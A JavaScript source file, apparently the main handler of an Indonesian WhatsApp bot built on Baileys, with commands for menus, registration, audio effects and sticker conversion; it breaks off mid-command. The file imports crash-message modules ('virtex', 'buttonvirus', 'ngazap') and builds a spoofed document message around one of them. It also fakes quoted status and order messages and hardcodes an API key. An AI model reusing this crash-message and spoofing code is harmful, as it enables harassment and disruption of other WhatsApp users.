require('./command/Edit/config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, WAFlag } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require('child_process')
const moment = require('moment-timezone')
const os = require('os')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const hx = require('hxz-api')
const cl = require('caliph-api') 
const cookie = require('cookie')
const crypto = require('crypto')
const yts = require('yt-search') 
const proces = require('process') 
const fetch = require('node-fetch')
const ffmpeg = require('fluent-ffmpeg')
const FormData = require('form-data')
const mathjs = require('mathjs')
const ms = require('ms')
const { ngazap } = require('./command/Lib/ngazap')
const { buttonvirus } = require('./command/Lib/buttonvirus')
const { virtext } = require('./command/Lib/virtext')
const { virtex10 } = require('./virtex/virtex10')
const { virtex9 } = require('./virtex/virtex9')
const { virtex6 } = require('./virtex/virtex6')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const Jimp = require('jimp') 
const { color, bgcolor } = require('./command/Lib/color')
const { addCmd, AddHituser } = require('./command/Lib/hitbot')
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser } = require('./command/Lib/register')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./command/Lib/exif')
const { smsg, formatp, clockString, format, getTime, formatDate, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep, getRandom, parseMention, getGroupAdmins, jsonformat, tanggal, runtime } = require('./command/Lib/myfunc')
const { niatsholat, 
asmaulhusna,  
bacaanshalat, 
getDoujin, 
onGoing, 
kusoNime,
ffstalk, 
npmstalk, 
quotesanime, 
pornovid, 
hentaivid, 
nomorhp, 
character, 
anime, 
manga, 
searchsticker, 
igstalk, 
igfoto, 
igvideo, 
listsurah, 
jadwalsholat, 
telesticker, 
aiovideodl, 
linkwa,
mediafiredl } = require('./command/Lib/scrape')

let hit = [];
hit_today = [];
const commund = JSON.parse(fs.readFileSync('./command/Database/datacmd.json'));
const hitbot = JSON.parse(fs.readFileSync('./command/Database/command.json'));
const userHit = JSON.parse(fs.readFileSync('./command/Database/userhit.json'));
const owner = JSON.parse(fs.readFileSync('./command/Database/owner.json'));
const utih = JSON.parse(fs.readFileSync('./command/Database/totalcmd.json'));
const _registered = JSON.parse(fs.readFileSync('./command/Database/registered.json'));
const register = JSON.parse(fs.readFileSync('./command/Database/register.json'));
global.db = JSON.parse(fs.readFileSync('./command/Database/database.json'))
const antilink = JSON.parse(fs.readFileSync('./command/Database/antilink.json'))
const autosticker = JSON.parse(fs.readFileSync('./command/Database/autosticker.json'))
const autoresponder = JSON.parse(fs.readFileSync('./command/Database/autoresponder.json'))
if (global.db) global.db = {       
    users: {},
    chats: {},
    sticker: {},
    database: {},
    game: {},
    settings: {},
    others: {},
    ...(global.db || {})
}

module.exports = sock = async (sock, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await sock.decodeJid(sock.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = args.join(" ")
const q = args.join(" ")
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const timestamp = speed();
const latensi = speed() - timestamp
hit_today.push(command);

const groupMetadata = m.isGroup ? await sock.groupMetadata(m.chat).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const AntiLink = m.isGroup ? antilink.includes(from) : false 
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false

        const content = JSON.stringify(m.message)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const isMedias = (m.mtype === 'imageMessage' || m.mtype === 'videoMessage')
		const isQuotedImage = m.mtype === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = m.mtype === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = m.mtype === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = m.mtype === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedLoca = m.mtype === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedContact = m.mtype === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocs = m.mtype === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedTeks = m.mtype === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = m.mtype === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedProd = m.mtype === 'extendedTextMessage' && content.includes('productMessage')
        const isQuotedReply = m.mtype === 'extendedTextMessage' && content.includes('Message')

        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
const isAutoResponder = m.isGroup ? autoresponder.includes(from) : false        
const banUser = await sock.fetchBlocklist()
const isBan = banUser ? banUser.includes(m.sender) : false
const isRegistered = checkRegisteredUser(m.sender)

const cmdadd = () => {
	    utih[0].totalnya += 1
    	fs.writeFileSync('./command/Database/totalcmd.json', JSON.stringify(utih))
        }
        if (isCmd) cmdadd()
        const totalhit = JSON.parse(fs.readFileSync('./command/Database/totalcmd.json'))[0].totalnya

function parseMention(text = '') {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const generateProfilePicture = async(buffer) => {
const jimp_1 = await Jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, Jimp.AUTO) : jimp_1.resize(Jimp.AUTO, 650)
const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(Jimp.MIME_JPEG)
}
}
            
const reSize = async(bsdjejd, ukur1, ukur2) => {
return new Promise(async(resolve, reject) => {
var baper = await Jimp.read(bsdjejd);
var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
resolve(ab)
})
}

let addHit = (sender, command) => {
hitbot.push({
"id": sender,
"command": command
})
fs.writeFileSync('./command/Database/hit.json', JSON.stringify(hitbot))
}
//BATAS NYAAA//
offline = false
//=================================================// 
const fakerikibangg = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    imageMessage: {
      mimetype: 'image/jpeg',
      caption: 'RIK - OHHz',
      viewOnce: true
    }
  }
}

const rik = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "12042285575-1488847308@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": "© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ✓️",
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6287741097274@s.whatsapp.net"
}}}}

const invitemas = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6287741097274-1616169743@g.us",
			"inviteCode": `${pushname}`,
			"groupName": `${pushname}`, 
            "caption": `RBL - RIKI BANGET LOH`, 
		}
	}
}
//=================================================//

const cmdBotTotal = require('util').inspect(hit.all)
const cmdBotHarian = require('util').inspect(hit.today)

if (!m.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', 
color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), 
color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (m.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', 
color(moment(m.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), 
color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (!sock.public) {
if (!m.key.fromMe) return
}

try {
ppuser = await sock.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)


if (m.sender.startsWith('212')) return sock.updateBlockStatus(m.sender, 'block')

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const alalla = JSON.parse(fs.readFileSync('./command/Database/anime.json'));
const ranthumb = alalla[Math.floor(Math.random() * alalla.length)];
const tytyd = await getBuffer(ranthumb)
const rkrk = await reSize(tytyd, 200, 200)

        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
        let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: sock.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, sock.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        sock.ev.emit('messages.upsert', msg)
        }

        const reply = async(teks) => {
        sock.sendMessage(m.chat, { text : teks, mentions: await sock.parseMention(teks), contextInfo : {
        "mentionedJid": [sender],
        "externalAdReply": {
        "showAdAttribution": true,
        "title": `Hai Kak ${pushname}👋🏻`, 
        "mediaType": 2, 
        "thumbnail": ppnyauser,
        "previewType": "VIDEO",
        "mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
        "sourceUrl": 'https://youtu.be/b0CCKgVEhlk'}}},
        { quoted: m })
        }
        	    
	    if (AntiLink) {
linkgce = await sock.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await sock.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
sock.sendMessage(from, {text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}

if (isCmd) {
addHit(sender, command)
AddHituser(sender, userHit)
}

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const troli = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6287741097274-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: '☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}

const lep = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc Bang`, 
"jpegThumbnail": ppnyauser
}
}
}

const riki = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "120363042285039849@g.us" } : {}) 
},
"message": {
"extendedTextMessage": {
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "6287741097274@s.whatsapp.net"
}}}}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}

function monospace(string) {
return '```' + string + '```'
}

async function post(url, formdata = {}, cookies) {
  let encode = encodeURIComponent;
  let body = Object.keys(formdata)
    .map((key) => {
      let vals = formdata[key];
      let isArray = Array.isArray(vals);
      let keys = encode(key + (isArray ? "[]" : ""));
      if (!isArray) vals = [vals];
      let out = [];
      for (let valq of vals) out.push(keys + "=" + encode(valq));
      return out.join("&");
    })
    .join("&");
  return await fetch(`${url}?${body}`, {
    method: "GET",
    headers: {
      Accept: "*/*",
      "Accept-Language": "en-US,en;q=0.9",
      "User-Agent": "GoogleBot",
      Cookie: cookies,
    },
  });
}

async function textpro(url, text) {
  if (!/^https:\/\/textpro\.me\/.+\.html$/.test(url))
    throw new Error("Url Salah!!");
  const geturl = await fetch(url, {
    method: "GET",
    headers: {
      "User-Agent": "GoogleBot",
    },
  });
  const caritoken = await geturl.text();
  let hasilcookie = geturl.headers
    .get("set-cookie")
    .split(",")
    .map((v) => cookie.parse(v))
    .reduce((a, c) => {
      return { ...a, ...c };
    }, {});
  hasilcookie = {
    __cfduid: hasilcookie.__cfduid,
    PHPSESSID: hasilcookie.PHPSESSID,
  };
  hasilcookie = Object.entries(hasilcookie)
    .map(([name, value]) => cookie.serialize(name, value))
    .join("; ");
  const $ = cheerio.load(caritoken);
  const token = $('input[name="token"]').attr("value");
  const form = new FormData();
  if (typeof text === "string") text = [text];
  for (let texts of text) form.append("text[]", texts);
  form.append("submit", "Go");
  form.append("token", token);
  form.append("build_server", "https://textpro.me");
  form.append("build_server_id", 1);
  const geturl2 = await fetch(url, {
    method: "POST",
    headers: {
      Accept: "*/*",
      "Accept-Language": "en-US,en;q=0.9",
      "User-Agent": "GoogleBot",
      Cookie: hasilcookie,
      ...form.getHeaders(),
    },
    body: form.getBuffer(),
  });
  const caritoken2 = await geturl2.text();
  const token2 = /<div.*?id="form_value".+>(.*?)<\/div>/.exec(caritoken2);
  if (!token2) throw new Error("Token Tidak Ditemukan!!");
  const prosesimage = await post(
    "https://textpro.me/effect/create-image",
    JSON.parse(token2[1]),
    hasilcookie
  );
  const hasil = await prosesimage.json();
  return `https://textpro.me${hasil.fullsize_image}`;
}

var sticWait = (hehe) => {
ano = fs.readFileSync('./command/stickernye/wait.webp')
sock.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./command/stickernye/BotAdman.webp')
sock.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./command/stickernye/owner.webp')
sock.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./command/stickernye/SuksesCok.webp')
sock.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./command/stickernye/BanLu.webp')
sock.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./command/stickernye/groupon.webp')
sock.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./command/stickernye/SiGroupadmin.webp')
sock.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}

const ktedh = await reSize(ppnyauser, 200, 200)

async function replyReg(teks) {
const buttonsDefault = [{ quickReplyButton: { displayText: ` ꪶ VERIFY ꫂ `, id: `${prefix}verify` } }]                 
const buttonMessage = { 
text: teks, 
footer: "⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ꪶ𖣂ꫂ", 
templateButtons: buttonsDefault, 
image: {url: ppnyauser}                                   
}
return sock.sendMessage(from, buttonMessage)
}

async function sendButRegis(from) {
var serialUser = createSerial(18)
_registered.push(sender)
fs.writeFileSync('./command/Database/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
var button = [
{ quickReplyButton: { displayText: `Menu`, id: `${prefix}menu` } }
]
var anj = `「 *PENDAFTARAN USER* 」
*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*

*🌹 Nama :* ${pushname}
*🌹 API :* +${sender.split('@')[0]}
*🌹 Serial:* ${serialUser}
*🌹 Total:* ${_registered.length} Pengguna`
sock.sendMessage(from, { caption: anj, location: { jpegThumbnail: ktedh }, templateButtons: button, footer: `⚞ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, mentions: [m.sender] })
.catch ((err) => reply(err))
}

const turbrek = `break`

switch (command) {
case 'menu': case 'help':
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
const botzkir = "6287741097274@s.whatsapp.net"
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
var bykir = rndm[Math.floor(Math.random() * rndm.length)]
mbc = `Hai Kak @${sender.split("@")[0]} 
Saya 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 Saya Disini Ingin Membantu Kalian Membuat Sticker Download Video/Lagu Youtube, Tiktok Dll.`
let buttoons = [
{buttonId: `${prefix}allmenu`, buttonText: {displayText: 'All Menu'}, type: 1}
]
let buttonMessaage = {
document: ktedh, 
fileName: ` 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`, 
mimetype: `application/${bykir}`,
jpegThumbnail: ktedh,
caption: mbc,
fileLength: "999999999",
mentions:[sender, botzkir],
footer: `_Powered By @${botzkir.split("@")[0]}_`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender, botzkir],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ktedh,
"previewType": "VIDEO",
"mediaUrl": 'https://chat.whatsapp.com/kepoanjing',
"sourceUrl": 'https://chat.whatsapp.com/kepoanjing'
}}
}
sock.sendMessage(m.chat, buttonMessaage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6287741097274-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: '☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
addCmd(command.slice(0), 1, commund)
break
case 'verify':{
if (isRegistered) return reply('Akun Kamu Sudah Terverfikasi!!!')
await sendButRegis(from)
}
addCmd(command.slice(0), 1, commund)
break
case 'igstalk':{
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Contoh ${prefix+command} rikigans`)
aj = await igstalk(`${q}`)
sock.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Stalking Instagram \\*

Fullname : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
addCmd(command.slice(0), 1, commund)
break
case 'online':
            if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
				offline = false
				reply('Status : ONLINE')
				break
			case 'offline':
			if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
				offline = true
                waktuafk = Date.now()
                anuu = body.slice(9) ? body.slice(9) : '-'
                alasanafk = anuu
				reply('Fitur OFFLINE diaktifkan')
				break
//=================================================//
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
if (isBan) throw sticBanLu(from)
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await sock.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
sock.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : rik })
fs.unlinkSync(ran)
})
} else reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
    break	
case 'tomp4': case 'tovidio': {
if (isBan) throw sticBanLu(from)
 // //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./command/Lib/uploader')
let media = await sock.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await sock.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: rik })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./command/Lib/converter')
let audio = await toAudio(media, 'mp4')
sock.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : rik })
}
break
case 'tomp3': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./rikilah/lib/converter')
let audio = await toAudio(media, 'mp4')
sock.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${sock.user.name}.mp3`}, { quoted : rik })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw sticBanLu(from)
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./command/Lib/converter')
let audio = await toPTT(media, 'mp4')
sock.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:rik})
}
break
case 'togif': {
if (isBan) throw sticBanLu(from)
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./command/Lib/uploader')
let media = await sock.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await sock.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: rik })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) throw sticBanLu(from) 
if (!text) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await sock.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./command/Lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await sock.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'once': case 'toonce': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await sock.downloadAndSaveMediaMessage(quoted)
sock.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: rik })
} else if (/video/.test(mime)) {
anu = await sock.downloadAndSaveMediaMessage(quoted)
sock.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: rik })
}
}
break
case 'tourl':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isMedia) return reply(`Reply Media Dengan Perintah *${prefix+command}*`)
bucat = await (m.quoted ? m.quoted : m).download()
var { result } = await require('./command/Lib/upload')(bucat)
reply(`*SUCCESS*\n\nURL : \`\`\`${result.url}\`\`\``)
break
case 'emojimix': {
if (isBan) throw sticBanLu(from)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 🙂+😎`
if (!emoji2) throw `Example : ${prefix + command} 🙂+😎`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await sock.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} 😎`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await sock.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'emoji':
if (isBan) return SticBanLu('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} 🗿`)
titor = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${encodeURI(q)}?apikey=${lolkey}`)
